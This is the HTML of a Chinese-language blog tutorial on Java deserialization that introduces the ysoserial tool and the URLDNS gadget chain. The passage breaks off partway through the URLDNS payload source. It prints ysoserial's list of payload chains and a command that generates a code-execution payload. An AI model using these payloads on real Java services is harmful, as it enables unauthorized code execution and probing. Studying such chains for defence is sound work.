@@ -1,0 +1,1127 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='前言 Java反序列化的基础知识前面已经大概了解了，现在终于到上手的时候了，这里按p牛说的来，先从DNSURL下手，进行反序列利用链的入门 ysoserial 这'>
+<title>[Java安全] URLDNS</title>
+
+<link rel='canonical' href='https://example.com/post/urldns/'>
+
+<link rel="stylesheet" href="/scss/style.min.a50aba51166dc5bc1c208df7b60653be38aa0ed7b643534462b6f2a9afb0a257.css"><meta property='og:title' content='[Java安全] URLDNS'>
+<meta property='og:description' content='前言 Java反序列化的基础知识前面已经大概了解了，现在终于到上手的时候了，这里按p牛说的来，先从DNSURL下手，进行反序列利用链的入门 ysoserial 这'>
+<meta property='og:url' content='https://example.com/post/urldns/'>
+<meta property='og:site_name' content='Huamang'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-09-29T00:34:07&#43;08:00'/><meta property='article:modified_time' content='2022-09-29T00:34:07&#43;08:00'/>
+<meta name="twitter:title" content="[Java安全] URLDNS">
+<meta name="twitter:description" content="前言 Java反序列化的基础知识前面已经大概了解了，现在终于到上手的时候了，这里按p牛说的来，先从DNSURL下手，进行反序列利用链的入门 ysoserial 这">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c79bb77476a4f0f53420443e9db5bfa_18691_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Huamang</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Huamang'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Huamang7'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#ysoserial">ysoserial</a></li>
+    <li><a href="#urldns">URLDNS</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java/" style="background-color: #faaa55; color: #fff;">
+                Java
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/urldns/">[Java安全] URLDNS</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 29, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="前言">前言</h1>
+<p>Java反序列化的基础知识前面已经大概了解了，现在终于到上手的时候了，这里按p牛说的来，先从DNSURL下手，进行反序列利用链的入门</p>
+<h1 id="ysoserial">ysoserial</h1>
+<p>这个工具我之前没专门研究过Java，但是也是在一些文章中见过很多次了，他的作用就是根据你选择的利用链去生成反序列化数据的工具</p>
+<p>使用方法也很简单，选择利用链和要执行的命令就行了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="nl">Usage:</span> <span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">.</span><span class="na">jar</span> <span class="o">[</span><span class="n">payload</span><span class="o">]</span> <span class="err">&#39;</span><span class="o">[</span><span class="n">command</span><span class="o">]</span><span class="err">&#39;</span>
+  <span class="n">Available</span> <span class="n">payload</span> <span class="n">types</span><span class="o">:</span>
+     <span class="n">Payload</span>             <span class="n">Authors</span>                     <span class="n">Dependencies</span>
+     <span class="o">-------</span>             <span class="o">-------</span>                     <span class="o">------------</span>
+     <span class="n">AspectJWeaver</span>       <span class="nd">@Jang</span>                       <span class="n">aspectjweaver</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">9</span><span class="o">.</span><span class="na">2</span><span class="o">,</span> <span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">2</span><span class="o">.</span><span class="na">2</span>
+     <span class="n">BeanShell1</span>          <span class="nd">@pwntester</span><span class="o">,</span> <span class="nd">@cschneider4711</span> <span class="n">bsh</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">0b5</span>
+     <span class="n">C3P0</span>                <span class="nd">@mbechler</span>                   <span class="n">c3p0</span><span class="o">:</span><span class="n">0</span><span class="o">.</span><span class="na">9</span><span class="o">.</span><span class="na">5</span><span class="o">.</span><span class="na">2</span><span class="o">,</span> <span class="n">mchange</span><span class="o">-</span><span class="n">commons</span><span class="o">-</span><span class="n">java</span><span class="o">:</span><span class="n">0</span><span class="o">.</span><span class="na">2</span><span class="o">.</span><span class="na">11</span>
+     <span class="n">Click1</span>              <span class="nd">@artsploit</span>                  <span class="n">click</span><span class="o">-</span><span class="n">nodeps</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">3</span><span class="o">.</span><span class="na">0</span><span class="o">,</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">-</span><span class="n">api</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">0</span>
+     <span class="n">Clojure</span>             <span class="nd">@JackOfMostTrades</span>           <span class="n">clojure</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">8</span><span class="o">.</span><span class="na">0</span>
+     <span class="n">CommonsBeanutils1</span>   <span class="nd">@frohoff</span>                    <span class="n">commons</span><span class="o">-</span><span class="n">beanutils</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">9</span><span class="o">.</span><span class="na">2</span><span class="o">,</span> <span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span><span class="o">,</span> <span class="n">commons</span><span class="o">-</span><span class="n">logging</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">2</span>
+     <span class="n">CommonsCollections1</span> <span class="nd">@frohoff</span>                    <span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span>
+     <span class="n">CommonsCollections2</span> <span class="nd">@frohoff</span>                    <span class="n">commons</span><span class="o">-</span><span class="n">collections4</span><span class="o">:</span><span class="n">4</span><span class="o">.</span><span class="na">0</span>
+     <span class="n">CommonsCollections3</span> <span class="nd">@frohoff</span>                    <span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span>
+     <span class="n">CommonsCollections4</span> <span class="nd">@frohoff</span>                    <span class="n">commons</span><span class="o">-</span><span class="n">collections4</span><span class="o">:</span><span class="n">4</span><span class="o">.</span><span class="na">0</span>
+     <span class="n">CommonsCollections5</span> <span class="nd">@matthias_kaiser</span><span class="o">,</span> <span class="nd">@jasinner</span> <span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span>
+     <span class="n">CommonsCollections6</span> <span class="nd">@matthias_kaiser</span>            <span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span>
+     <span class="n">CommonsCollections7</span> <span class="nd">@scristalli</span><span class="o">,</span> <span class="nd">@hanyrax</span><span class="o">,</span> <span class="nd">@EdoardoVignati</span> <span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span>
+     <span class="n">FileUpload1</span>         <span class="nd">@mbechler</span>                   <span class="n">commons</span><span class="o">-</span><span class="n">fileupload</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">3</span><span class="o">.</span><span class="na">1</span><span class="o">,</span> <span class="n">commons</span><span class="o">-</span><span class="n">io</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">4</span>
+     <span class="n">Groovy1</span>             <span class="nd">@frohoff</span>                    <span class="n">groovy</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">3</span><span class="o">.</span><span class="na">9</span>
+     <span class="n">Hibernate1</span>          <span class="nd">@mbechler</span>
+     <span class="n">Hibernate2</span>          <span class="nd">@mbechler</span>
+     <span class="n">JBossInterceptors1</span>  <span class="nd">@matthias_kaiser</span>            <span class="n">javassist</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">12</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">GA</span><span class="o">,</span> <span class="n">jboss</span><span class="o">-</span><span class="n">interceptor</span><span class="o">-</span><span class="n">core</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">0</span><span class="o">.</span><span class="na">0</span><span class="o">.</span><span class="na">Final</span><span class="o">,</span> <span class="n">cdi</span><span class="o">-</span><span class="n">api</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">0</span><span class="o">-</span><span class="n">SP1</span><span class="o">,</span> <span class="n">javax</span><span class="o">.</span><span class="na">interceptor</span><span class="o">-</span><span class="n">api</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span><span class="o">,</span> <span class="n">jboss</span><span class="o">-</span><span class="n">interceptor</span><span class="o">-</span><span class="n">spi</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">0</span><span class="o">.</span><span class="na">0</span><span class="o">.</span><span class="na">Final</span><span class="o">,</span> <span class="n">slf4j</span><span class="o">-</span><span class="n">api</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">7</span><span class="o">.</span><span class="na">21</span>
+     <span class="n">JRMPClient</span>          <span class="nd">@mbechler</span>
+     <span class="n">JRMPListener</span>        <span class="nd">@mbechler</span>
+     <span class="n">JSON1</span>               <span class="nd">@mbechler</span>                   <span class="n">json</span><span class="o">-</span><span class="n">lib</span><span class="o">:</span><span class="n">jar</span><span class="o">:</span><span class="n">jdk15</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">4</span><span class="o">,</span> <span class="n">spring</span><span class="o">-</span><span class="n">aop</span><span class="o">:</span><span class="n">4</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">4</span><span class="o">.</span><span class="na">RELEASE</span><span class="o">,</span> <span class="n">aopalliance</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">0</span><span class="o">,</span> <span class="n">commons</span><span class="o">-</span><span class="n">logging</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">2</span><span class="o">,</span> <span class="n">commons</span><span class="o">-</span><span class="n">lang</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">6</span><span class="o">,</span> <span class="n">ezmorph</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">0</span><span class="o">.</span><span class="na">6</span><span class="o">,</span> <span class="n">commons</span><span class="o">-</span><span class="n">beanutils</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">9</span><span class="o">.</span><span class="na">2</span><span class="o">,</span> <span class="n">spring</span><span class="o">-</span><span class="n">core</span><span class="o">:</span><span class="n">4</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">4</span><span class="o">.</span><span class="na">RELEASE</span><span class="o">,</span> <span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span>
+     <span class="n">JavassistWeld1</span>      <span class="nd">@matthias_kaiser</span>            <span class="n">javassist</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">12</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">GA</span><span class="o">,</span> <span class="n">weld</span><span class="o">-</span><span class="n">core</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">33</span><span class="o">.</span><span class="na">Final</span><span class="o">,</span> <span class="n">cdi</span><span class="o">-</span><span class="n">api</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">0</span><span class="o">-</span><span class="n">SP1</span><span class="o">,</span> <span class="n">javax</span><span class="o">.</span><span class="na">interceptor</span><span class="o">-</span><span class="n">api</span><span class="o">:</span><span class="n">3</span><span class="o">.</span><span class="na">1</span><span class="o">,</span> <span class="n">jboss</span><span class="o">-</span><span class="n">interceptor</span><span class="o">-</span><span class="n">spi</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">0</span><span class="o">.</span><span class="na">0</span><span class="o">.</span><span class="na">Final</span><span class="o">,</span> <span class="n">slf4j</span><span class="o">-</span><span class="n">api</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">7</span><span class="o">.</span><span class="na">21</span>
+     <span class="n">Jdk7u21</span>             <span class="nd">@frohoff</span>
+     <span class="n">Jython1</span>             <span class="nd">@pwntester</span><span class="o">,</span> <span class="nd">@cschneider4711</span> <span class="n">jython</span><span class="o">-</span><span class="n">standalone</span><span class="o">:</span><span class="n">2</span><span class="o">.</span><span class="na">5</span><span class="o">.</span><span class="na">2</span>
+     <span class="n">MozillaRhino1</span>       <span class="nd">@matthias_kaiser</span>            <span class="n">js</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">7R2</span>
+     <span class="n">MozillaRhino2</span>       <span class="nd">@_tint0</span>                     <span class="n">js</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">7R2</span>
+     <span class="n">Myfaces1</span>            <span class="nd">@mbechler</span>
+     <span class="n">Myfaces2</span>            <span class="nd">@mbechler</span>
+     <span class="n">ROME</span>                <span class="nd">@mbechler</span>                   <span class="n">rome</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">0</span>
+     <span class="n">Spring1</span>             <span class="nd">@frohoff</span>                    <span class="n">spring</span><span class="o">-</span><span class="n">core</span><span class="o">:</span><span class="n">4</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">4</span><span class="o">.</span><span class="na">RELEASE</span><span class="o">,</span> <span class="n">spring</span><span class="o">-</span><span class="n">beans</span><span class="o">:</span><span class="n">4</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">4</span><span class="o">.</span><span class="na">RELEASE</span>
+     <span class="n">Spring2</span>             <span class="nd">@mbechler</span>                   <span class="n">spring</span><span class="o">-</span><span class="n">core</span><span class="o">:</span><span class="n">4</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">4</span><span class="o">.</span><span class="na">RELEASE</span><span class="o">,</span> <span class="n">spring</span><span class="o">-</span><span class="n">aop</span><span class="o">:</span><span class="n">4</span><span class="o">.</span><span class="na">1</span><span class="o">.</span><span class="na">4</span><span class="o">.</span><span class="na">RELEASE</span><span class="o">,</span> <span class="n">aopalliance</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">0</span><span class="o">,</span> <span class="n">commons</span><span class="o">-</span><span class="n">logging</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">2</span>
+     <span class="n">URLDNS</span>              <span class="nd">@gebl</span>
+     <span class="n">Vaadin1</span>             <span class="nd">@kai_ullrich</span>                <span class="n">vaadin</span><span class="o">-</span><span class="n">server</span><span class="o">:</span><span class="n">7</span><span class="o">.</span><span class="na">7</span><span class="o">.</span><span class="na">14</span><span class="o">,</span> <span class="n">vaadin</span><span class="o">-</span><span class="n">shared</span><span class="o">:</span><span class="n">7</span><span class="o">.</span><span class="na">7</span><span class="o">.</span><span class="na">14</span>
+     <span class="n">Wicket1</span>             <span class="nd">@jacob</span><span class="o">-</span><span class="n">baines</span>               <span class="n">wicket</span><span class="o">-</span><span class="n">util</span><span class="o">:</span><span class="n">6</span><span class="o">.</span><span class="na">23</span><span class="o">.</span><span class="na">0</span><span class="o">,</span> <span class="n">slf4j</span><span class="o">-</span><span class="n">api</span><span class="o">:</span><span class="n">1</span><span class="o">.</span><span class="na">6</span><span class="o">.</span><span class="na">4</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>使用实例</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="n">ysoserial</span><span class="o">.</span><span class="na">jar</span> <span class="n">CommonsCollections1</span> <span class="n">calc</span><span class="o">.</span><span class="na">exe</span> <span class="o">&gt;</span> <span class="n">payload</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="urldns">URLDNS</h1>
+<p>接下来就到了这篇文章的主题：URLDNS</p>
+<p>他是一条利用链的名字，但是他和平常的利用链不一样，他的参数不是命令，而是URL，他触发的也不是命令执行，而是发起一次DNS请求</p>
+<p>我们直接去他的repo分析一下ysoserial的代码是怎么写的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">URLDNS</span> <span class="kd">implements</span> <span class="n">ObjectPayload</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="o">{</span>
+
+        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span> <span class="n">url</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+                <span class="c1">//Avoid DNS resolution during payload creation
+</span><span class="c1"></span>                <span class="c1">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.
+</span><span class="c1"></span>                <span class="n">URLStreamHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SilentURLStreamHandler</span><span class="o">();</span>
+
+                <span class="n">HashMap</span> <span class="n">ht</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span> <span class="c1">// HashMap that will contain the URL
+</span><span class="c1"></span>                <span class="n">URL</span> <span class="n">u</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">url</span><span class="o">,</span> <span class="n">handler</span><span class="o">);</span> <span class="c1">// URL to use as the Key
